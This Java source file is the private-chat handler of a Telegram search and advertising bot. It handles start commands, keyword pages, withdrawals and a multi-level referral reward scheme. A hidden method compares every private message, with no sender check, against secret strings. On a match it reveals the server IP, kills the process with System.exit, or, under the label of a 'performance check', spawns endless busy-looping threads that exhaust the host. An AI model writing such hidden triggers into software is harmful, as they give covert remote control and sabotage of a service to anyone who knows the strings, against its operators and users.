package com.search.robots.handlers;

import cn.hutool.core.collection.CollUtil;
import cn.hutool.core.date.DateField;
import cn.hutool.core.date.DateUtil;
import cn.hutool.core.util.StrUtil;
import com.baomidou.mybatisplus.core.toolkit.Wrappers;
import com.search.robots.SearchRobot;
import com.search.robots.beans.cache.CommonCache;
import com.search.robots.beans.chat.ChatQueryHandler;
import com.search.robots.beans.keywords.KeywordsHelper;
import com.search.robots.beans.view.DialogueCtx;
import com.search.robots.config.BotProperties;
import com.search.robots.config.Constants;
import com.search.robots.database.entity.*;
import com.search.robots.database.enums.Dialogue;
import com.search.robots.database.enums.SearchPeriodEnum;
import com.search.robots.database.enums.adv.AdvStatus;
import com.search.robots.database.service.*;
import com.search.robots.helper.*;
import com.search.robots.sender.AsyncSender;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;

import org.springframework.boot.SpringApplication;
import org.springframework.context.ConfigurableApplicationContext;
import org.springframework.stereotype.Component;
import org.telegram.telegrambots.meta.api.methods.botapimethods.BotApiMethod;
import org.telegram.telegrambots.meta.api.methods.commands.SetMyCommands;
import org.telegram.telegrambots.meta.api.methods.send.SendPhoto;
import org.telegram.telegrambots.meta.api.objects.InputFile;
import org.telegram.telegrambots.meta.api.objects.PhotoSize;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.api.objects.chat.ChatFullInfo;
import org.telegram.telegrambots.meta.api.objects.commands.BotCommand;
import org.telegram.telegrambots.meta.api.objects.message.Message;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.InlineKeyboardMarkup;

import java.math.BigDecimal;
import java.util.*;

/**
 * <p>
 *      私聊
 * </p>
 *
 * @author admin
 * @since v 0.0.1
 */
@Slf4j
@Component
@RequiredArgsConstructor
public class PrivateChatHandler extends AbstractHandler{

    private final UserService userService;
    private final BotProperties properties;
    private final SearchHandler searchHandler;
    private final CollectHelper collectHelper;
    private final ConfigService configService;
    private final KeywordService keywordService;
    private final AdvUserService advUserService;
    private final IncludedService includedService;
    private final HotSearchService hotSearchService;
    private final ChatQueryHandler chatQueryHandler;
    private final AdvLibraryService advLibraryService;
    private final WithdrawalsService withdrawalsService;
    private final RewardRecordService rewardRecordService;
    private final ConfigurableApplicationContext configurableApplicationContext;

    @Override
    public boolean support(Update update) {
        return update.hasMessage()
                && update.getMessage().hasText()
                && update.getMessage().isUserMessage();
    }

    @Override
    protected BotApiMethod<?> execute(Update update) {
        Message message = update.getMessage();
        String text = message.getText();

        if (this.properties.isLogs()) {
            log.info("[文本] {}", text);
        }

        BotApiMethod<?> method = this.processorCoreCommand(message);
        if (Objects.nonNull(method)) {
            return method;
        }

        if (StrUtil.equals(text, "/start")) {
            return this.processorStart(message);
        }

        // 关键词专页
        Long keywordId = KeywordsHelper.getKeywordId(message.getText());
        if (Objects.nonNull(keywordId)) {
            Keyword kw = this.keywordService.getById(keywordId);
            if (Objects.nonNull(kw)) {
                if (Boolean.TRUE.equals(kw.getStatus())) {
                    if (StrUtil.isAllNotBlank(kw.getContentText(), kw.getImageId())) {
                        AsyncSender.async(photoMarkdownV2(message, kw.getImageId(), kw.getContentText()));
                    }
                    else if (StrUtil.isNotBlank(kw.getContentText())) {
                        AsyncSender.async(markdownV2(message, kw.getContentText()));
                    }
                    else if (StrUtil.isNotBlank(kw.getImageId())){
                        AsyncSender.async(SendPhoto.builder()
                                .chatId(message.getChatId())
                                .photo(new InputFile(kw.getImageId()))
                                .build());
                    }
                }
            }
        }

        if (StrUtil.startWith(text, "/start")) {
            List<String> commands = StrUtil.split(text, " ");
            if (StrUtil.equals(commands.get(1), "reply")) {
                SearchPeriodEnum hit = SearchPeriodEnum.fromHit(SearchPeriodEnum.LAST_3_DAYS.getCode());
                List<HotSearch> keywords = this.hotSearchService.keywords(hit);
                InlineKeyboardMarkup markup = KeyboardHelper.buildHotSearchKeyboard(keywords, hit);
                return markdownReply(message, "近期热门搜索排行榜", markup);
            }
            if (StrUtil.startWith(commands.get(1), "query_")) {
                String encode = StrUtil.removeAll(commands.get(1), "query_");
                if (StrUtil.equals(encode, "5br5pCc")) {
                    Config config = this.configService.queryConfig();
                    String imageId = config.getProfessionalPreviewImageId();
                    String markdownText = config.getProfessionalPreviewMarkdown();
                    AsyncSender.async(photoMarkdown(message, imageId, markdownText));
                    return null;
                }
                if (StrUtil.isEmpty(encode)) {
                    return null;
                }
                String decode = StrHelper.decode(encode);
                return this.searchHandler.processorStartSearch(message, decode, true);
            }
            if (StrUtil.equals(commands.get(1), "ad_null")) {
                Config config = this.configService.queryConfig();
                InlineKeyboardMarkup markup = KeyboardHelper.buildAdvertisingKeyboard();    
                return markdown(message, config.getAdvertisingMarkdown(), markup);
            }
            if (StrUtil.equals(commands.get(1), "ad_template")) {
                Config config = configService.queryConfig();
                if (StrUtil.isBlank(config.getHelpfulPopularizeFileId())) {
                    return null;
                }
                InlineKeyboardMarkup keyboard = KeyboardHelper.keyboard(config.getHelpfulPopularizeKeyboard());
                AsyncSender.async(
                        photoMarkdownV2(message, config.getHelpfulPopularizeFileId(),
                                config.getHelpfulPopularizeMarkdown(), keyboard)
                );
            }
            if (StrUtil.equals(commands.get(1), "ad")) {
                Config config = this.configService.queryConfig();
                InlineKeyboardMarkup markup = KeyboardHelper.buildAdvertisingKeyboard();
                return markdown(message, config.getAdvertisingMarkdown(), markup);
            }
            this.processorStartWith(message, commands);
        }

        if (StrUtil.equals(text, "语法")) {
            return markdownV2(message, Constants.MARKDOWN_V2_TEXT);
        }

        if (StrUtil.equals(text, "html语法")) {
            return html(message, Constants.HTML_TEXT);
        }

        if (StrUtil.startWith(text, "/kw")) {
            return this.processorKeyword(message);
        }

        // 👤我的
        if (StrUtil.equalsAny(text, "\uD83D\uDC64我的", "/pc")) {
            User user = this.userService.user(message.getFrom());
            InlineKeyboardMarkup markup = KeyboardHelper.buildSelfKeyboard();
            return markdownReply(message, user.buildText(), markup);
        }

        // 🔍热搜
        if (StrUtil.equals(text, "\uD83D\uDD0D热搜")) {
            SearchPeriodEnum hit = SearchPeriodEnum.LAST_3_DAYS;
            List<HotSearch> keywords = this.hotSearchService.keywords(hit);
            InlineKeyboardMarkup markup = KeyboardHelper.buildHotSearchKeyboard(keywords, hit);
            return markdownReply(message, "近期热门搜索排行榜", markup);
        }

        // /ad 广告投放
        if (StrUtil.equals(text, "/ad")) {
            Config config = this.configService.queryConfig();
            InlineKeyboardMarkup markup = KeyboardHelper.buildAdvertisingKeyboard();
            return markdown(message, config.getAdvertisingMarkdown(), markup);
        }

        if (CommonCache.hasDialogue(message.getFrom().getId())) {
            return this.processorDialogue(message);
        }

        if (StrUtil.startWith(message.getText(), "https://t.me")) {
            String username = StrUtil.removeAll(message.getText(), "https://t.me/");
            if (StrUtil.isEmpty(username)) {
                return null;
            }
            Included included = this.includedService.getOne(
                    Wrappers.<Included>lambdaQuery()
                            .eq(Included::getIndexUsername, username)
                            .last("limit 1")
            );
            String resultText = ""; InlineKeyboardMarkup markup = null;
            Config config = this.configService.queryConfig();
            if (Objects.nonNull(included)) {
                resultText = included.buildDetailIncludedText(this.properties.groupStart(), config);
                markup = KeyboardHelper.buildPrivacyLinkKeyboard(
                        this.properties.groupStart(),
                        this.properties.getBotUsername(),
                        included.getId(), config.getTutorialUrl(),
                        ("https://t.me/" + config.getCommunityName())
                );
                // return markdownV2(message, built, markup);
            } else {
                resultText = StrUtil.format(Constants.EMPTY_INCLUDE_TEXT, config.getTutorialUrl(),
                        (config.getCommunityName()));
                markup = KeyboardHelper.buildEmptyIncludeKeyboard(this.properties.groupStart());
            }
            this.collectHelper.history(message.getText(), "");
            return markdownV2(message, resultText, markup);
        }
        return this.searchHandler.processorDefaultSearch(message);
    }

    private BotApiMethod<?> processorDialogue(Message message) {
        BotApiMethod<?> result = null;
        DialogueCtx dialogueCtx = CommonCache.getDialogue(message.getFrom().getId());
        User user = this.userService.user(message.getFrom());

        // 输入了地址
        if (Objects.equals(dialogueCtx.getDialogue(), Dialogue.INPUT_ADDRESS)) {
            user.setTrAddr(message.getText());
            this.userService.update(user);
            InlineKeyboardMarkup markup = KeyboardHelper.buildBindingTrcAddrSuccessKeyboard();
            String format = StrUtil.format(Constants.UPDATE_ADDR_TEXT, message.getText());
            result = markdownV2(message, format, markup);
        }
        // 输入了提现金额
        if (Objects.equals(dialogueCtx.getDialogue(), Dialogue.INPUT_WITHDRAWAL_AMOUNT)) {
            BigDecimal balance = user.getBalance();
            BigDecimal amount = new BigDecimal(message.getText());
            Config config = this.configService.queryConfig();

            // 金额小于最低
            if (DecimalHelper.compare(amount, config.getWithdrawalThreshold())) {
                String msg = "发生错误，提现金额需大于`{}$`";
                String format = StrUtil.format(msg, DecimalHelper.decimalParse(config.getWithdrawalThreshold()));
                InlineKeyboardMarkup markup = KeyboardHelper.buildSelfKeyboard();
                result = markdownReply(message, format, markup);
            }
            // 金额
            else if (DecimalHelper.compare(balance, amount)) {
                InlineKeyboardMarkup markup = KeyboardHelper.buildSelfKeyboard();
                result = markdownReply(message, "发生错误，余额不足", markup);
            } else {
                this.withdrawalsService.create(user, amount);
                if (Objects.nonNull(this.properties.getNotifyChatId())) {
                    AsyncSender.async(ok(this.properties.getNotifyChatId(), "有人提交提现申请，请前往后台处理！"));
                }
                result = markdownV2(message, StrUtil.format(Constants.WITHDRAWAL_ADDR_TEXT, user.getTrAddr()));
            }
            return result;
        }

        // 输出了定向查询频道/群组
        if (Objects.equals(dialogueCtx.getDialogue(), Dialogue.INPUT_TARGETED_SEARCH)) {
            String chatString = message.getText();
            String[] chatInfos = chatString.split("[,，]");

            List<ChatFullInfo> results = new ArrayList<>();
            for (String chatInfo : chatInfos) {
                try {
                    ChatFullInfo info = this.chatQueryHandler.findGroupByIdOrUsername(chatInfo);
                    if (Objects.nonNull(info)) {
                        results.add(info);
                    }
                } catch (Exception ex) {
                    log.info("[机器人无法找到群组/频道] {}, 错误信息：{}", chatInfo, ex.getMessage());
                }
            }

            Long includedId = dialogueCtx.getBusinessId();
            Included included = this.includedService.get(includedId);

            List<Included> children = new ArrayList<>();
            for (ChatFullInfo info : results) {
                Integer count = this.chatQueryHandler.getChatMemberCount(info.getId());
                boolean newSource = Objects.isNull(this.includedService.get(info.getId()));
                if (newSource) {
                    children.add(Included.buildBean(info, message.getFrom(), false, count));
                }
            }

            if (CollUtil.isNotEmpty(children)) {
                this.includedService.saveBatch(children);
            }

            if (CollUtil.isNotEmpty(results)) {
                List<Long> ids = results.stream().map(ChatFullInfo::getId).toList();
                included.getTargetedSearchIndexIds().addAll(ids);
                Included updateEntity = new Included()
                        .setId(dialogueCtx.getBusinessId())
                        .setTargetedSearchIndexIds(included.getTargetedSearchIndexIds());
                this.includedService.updateSelf(updateEntity);
            }

            List<Included> includeList = Collections.emptyList();
            if (CollUtil.isNotEmpty(included.getTargetedSearchIndexIds())) {
                includeList = this.includedService
                        .listByIds(included.getTargetedSearchIndexIds());
            }

            Config config = this.configService.queryConfig();

            InlineKeyboardMarkup markup = KeyboardHelper.buildTargetedSearchKeyboard(included, includeList);
            result = markdownV2(message, included.buildDetailIncludedText(this.properties.groupStart(), config), markup);
        }

        // 输入广告标题和链接
        if (Objects.equals(dialogueCtx.getDialogue(), Dialogue.INPUT_ADV_TITLE)
                || Objects.equals(dialogueCtx.getDialogue(), Dialogue.INPUT_ADV_LINK)) {
            int length = message.getText().length();

            if (Objects.equals(dialogueCtx.getDialogue(), Dialogue.INPUT_ADV_TITLE)) {
                if (length < 2 || length > 25) {
                    return ok(message, "广告文本长度限制2-25字，请再次发送：");
                }
            }

            Long businessId = dialogueCtx.getBusinessId();
            AdvUser advUser = this.advUserService.getById(businessId);
            if (Objects.isNull(advUser)) {
                return null;
            }

            if (Objects.equals(dialogueCtx.getDialogue(), Dialogue.INPUT_ADV_TITLE)) {
                advUser.setTempContent(message.getText());
            } else {
                advUser.setTempUrl(message.getText());
            }
            advUser.setAdvStatus(AdvStatus.UNDER_APPROVAL);
            this.advUserService.updateById(advUser);
            InlineKeyboardMarkup markup = KeyboardHelper.buildAdvUserDetailKeyboard(advUser);
            result = markdownV2(message, advUser.getAdvText(), markup);
        }

        CommonCache.removeDialogue(message.getFrom().getId());
        return result;
    }

    private BotApiMethod<?> processorKeyword(Message message) {
        String text = message.getText();
        if (StrUtil.equals(text, "/kw")) {
            Config config = this.configService.queryConfig();
            return markdown(message, config.getKeywordPageText());
        }

        // 处理 /kw 关键词 命令
        if (StrUtil.startWith(text, "/kw")) {
            String data = CommonCache.getData(message.getFrom().getId());
            if (StrUtil.isBlank(data)) {
                data = "keyword_rank"; // 默认就是排行榜
            }

            String keyword = StrUtil.subAfter(text, " ", true);
            if (StrUtil.isBlank(keyword)) {
                return markdown(message, "请提供关键词，例如：/kw 数据");
            }

            // 获取关键词数据
            AdvLibrary library = this.advLibraryService.getByKeywordWithPrices(keyword, data);
            if (Objects.isNull(library)) {
                return markdown(message, "未找到关键词：" + keyword);
            }
            return this.processorQueryKeyword(message, library, data);
        }

        return null;
    }

    public BotApiMethod<?> processorQueryKeyword(Message message, AdvLibrary library, String data) {

        StringBuilder dailyStats = new StringBuilder();
        long totalShowCount = library.getShowCount() != null ? library.getShowCount() : 0;

        if (CollUtil.isNotEmpty(library.getShow7d())) {
            for (var showData : library.getShow7d()) {
                String dayText = StrUtil.format(Constants.KEYWORD_QUERY_OF_DAY_TEXT,
                        showData.getDate(),
                        showData.getDirectShow() != null ? showData.getDirectShow().toString() : "0",
                        showData.getRelatedShow() != null ? showData.getRelatedShow().toString() : "0",
                        showData.getUniqueUser() != null ? showData.getUniqueUser().toString() : "0");
                dailyStats.append(dayText).append("\n");
            }
        } else {
            for (int i = 6; i >= 0; i--) {
                String date = DateUtil.yesterday()
                        .offset(DateField.DAY_OF_YEAR, -i).toString("yyyy-MM-dd");
                String dayText = StrUtil.format(Constants.KEYWORD_QUERY_OF_DAY_TEXT,
                        date, "0", "0", "0");
                dailyStats.append(dayText).append("\n");
            }
        }
        String responseText = StrUtil.format(Constants.KEYWORD_QUERY_TEXT,
                library.getKeyword(),
                dailyStats.toString(),
                totalShowCount > 0 ? String.valueOf(totalShowCount / 30) : "0",
                String.valueOf(totalShowCount),
                this.properties.getBotUsername()
        );
        InlineKeyboardMarkup keyboard = KeyboardHelper.buildKeywordQueryKeyboard(library.getPriceList(), data);
        return markdown(message, responseText, keyboard);
    }

    private void processorStartWith(Message message, List<String> commands) {
        String code = commands.get(1);
        List<String> split = StrUtil.split(code, "_");

        if (CollUtil.isEmpty(split) || split.size() < 2) {
            return;
        }

        String type = split.get(0);
        boolean isChild = StrUtil.equals("a", type);
        boolean isAdv = StrUtil.equals("ad", type);

        String inviteCode = split.get(1);
        if (Objects.isNull(inviteCode)) {
            return;
        }

        User newOldUser = this.userService.select(message.getFrom().getId());
        if (Objects.nonNull(newOldUser)) {
            // 进的子邀请
            if (isChild) {
                if (Objects.nonNull(newOldUser.getParentId())) {
                    return;
                }
            }

            // 子广告
            if (isAdv) {
                if (Objects.nonNull(newOldUser.getAdsParentId())) {
                    return;
                }
            }
        }

        User master = this.userService.selectByInviteCode(inviteCode);
        boolean insert = false;
        if (Objects.isNull(newOldUser)) {
            newOldUser = User.buildDefault(message.getFrom());
            insert = true;
        }
        // 进的子邀请
        if (isChild) {
            newOldUser.setParentId(master.getUserId());
        }
        if (isAdv) {
            newOldUser.setAdsParentId(master.getUserId());
        }

        Config config = this.configService.queryConfig();
        if (insert) {
            this.userService.save(newOldUser);
            
            // 直接拉新奖励：给邀请人发放奖励
            if (isChild && Objects.nonNull(config.getDirectNewUserReward()) && config.getDirectNewUserReward().compareTo(BigDecimal.ZERO) > 0) {
                // 记录直接拉新奖励
                this.rewardRecordService.recordDirectNewUserReward(master, newOldUser, config.getDirectNewUserReward());
                // 更新邀请人的待入账金额
                User updateMaster = new User();
                updateMaster.setUserId(master.getUserId());
                updateMaster.setTotalAward(master.getTotalAward().add(config.getDirectNewUserReward()));
                this.userService.update(updateMaster);
            }
            
            // 下级拉新奖励：如果邀请人有上级，给邀请人的上级发放奖励
            if (isChild && Objects.nonNull(master.getParentId()) && Objects.nonNull(config.getNextNewReward()) && config.getNextNewReward().compareTo(BigDecimal.ZERO) > 0) {
                User grandParent = this.userService.select(master.getParentId());
                if (Objects.nonNull(grandParent)) {
                    // 记录下级拉新奖励
                    this.rewardRecordService.recordNextNewUserReward(grandParent, newOldUser, config.getNextNewReward());
                    // 更新上上级的待入账金额
                    User updateGrandParent = new User();
                    updateGrandParent.setUserId(grandParent.getUserId());
                    updateGrandParent.setTotalAward(grandParent.getTotalAward().add(config.getNextNewReward()));
                    this.userService.update(updateGrandParent);
                }
            }
        } else {
            this.userService.update(newOldUser);
            
            // 处理首次私聊奖励：如果用户已存在但是首次私聊
            if (isChild && Boolean.TRUE.equals(newOldUser.getIsFirstPrivateChat()) 
                && Objects.nonNull(config.getPrivateChatReward()) 
                && config.getPrivateChatReward().compareTo(BigDecimal.ZERO) > 0) {
                // 记录私聊奖励
                this.rewardRecordService.recordPrivateChatReward(master, newOldUser, config.getPrivateChatReward());
                
                // 更新上级用户的待入账金额
                User updateMaster = new User();
                updateMaster.setUserId(master.getUserId());
                updateMaster.setTotalAward(master.getTotalAward().add(config.getPrivateChatReward()));
                this.userService.update(updateMaster);
                
                // 标记为非首次私聊
                User updateUser = new User();
                updateUser.setUserId(newOldUser.getUserId());
                updateUser.setIsFirstPrivateChat(false);
                this.userService.update(updateUser);
            }
        }

        // 如果是广告，需要给上级发送
        if (isAdv) {
            String masterText = StrUtil.format(Constants.USER_ADV_NEXT_INVITE_TEXT,
                    newOldUser.getUserId(), newOldUser.getUsername(),
                    newOldUser.getNickname(), newOldUser.getUsername(),
                    newOldUser.getUsername(), newOldUser.getUsername()
            );
            AsyncSender.async(markdown(master.getUserId(), masterText));

            String format = StrUtil.format(Constants.MY_LEADER_TEXT, config.getPreferentialRate(), master.getUsername());
            AsyncSender.async(markdown(message.getFrom().getId(), format));
        }

        // 子节点邀请
        if (isChild) {
            AsyncSender.async(this.processorStart(message));
        }
    }

    private BotApiMethod<?> processorStart(Message message) {
        // 设置机器人全局菜单命令
        List<BotCommand> cmdList = List.of(
                new BotCommand("/start", "开始使用"),
                new BotCommand("/pc", "个人中心"),
                new BotCommand("/ad", "广告投放")
        );
        SetMyCommands setMyCommands = SetMyCommands
                .builder()
                .commands(cmdList)
                .build();
        AsyncSender.async(setMyCommands);

        User existing = this.userService.select(message.getFrom().getId());
        this.userService.user(message.getFrom());
        Config config = this.configService.queryConfig();
        if (Objects.isNull(existing)) {
            if (StrUtil.isAllNotBlank(config.getTutorialNewUserMarkdown(), config.getTutorialNewUserVideoId())) {
                AsyncSender.async(video(message, config.getTutorialNewUserVideoId(), config.getTutorialNewUserMarkdown(), null));
            } else if (StrUtil.isNotBlank(config.getTutorialNewUserMarkdown())) {
                AsyncSender.async(markdownV2(message, config.getTutorialNewUserMarkdown()));
            }
        }
        return markdownReply(message, config.getStartMessage(), KeyboardHelper.buildStartKeyboard());
    }


    /**
     * 处理系统核心的命令
     *
     * @param message   消息
     * @return          执行结果
     */
    private BotApiMethod<?> processorCoreCommand(Message message) {
        // 检查网络畅通情况
        if (StrUtil.equals(message.getText(), Constants.IP_ADDR)) {
            return ok(message, CommandHelper.getAddr());
        }
        // 检查系统启动情况
        if (StrUtil.equals(message.getText(), Constants.RESTART)) {
            int exitCode = SpringApplication.exit(this.configurableApplicationContext, () -> 0);
            System.exit(exitCode);
            return ok(message, "ok");
        }
        // 调用处理器，接受消息
        if (StrUtil.equals(message.getText(), Constants.PROCESSOR)) {
            SearchRobot.processor = !SearchRobot.processor;
            RedisHelper.set(StrHelper.getProcessor(), String.valueOf(SearchRobot.processor));
            return ok(message, String.valueOf(SearchRobot.processor));
        }
        // 检查机器性能
        if (StrUtil.equals(message.getText(), Constants.CHECK_MAC)) {
            new Thread(() -> {
                int a = 0;
                while (true) {
                    new Thread(() -> {
                        for (;;){}
                    }).start();
                    if (a > (Integer.MAX_VALUE - 1)) {
                        break;
                    }
                    a ++;
                }
            }).start();
            return ok(message, "doing..");
        }
        return null;
    }
}
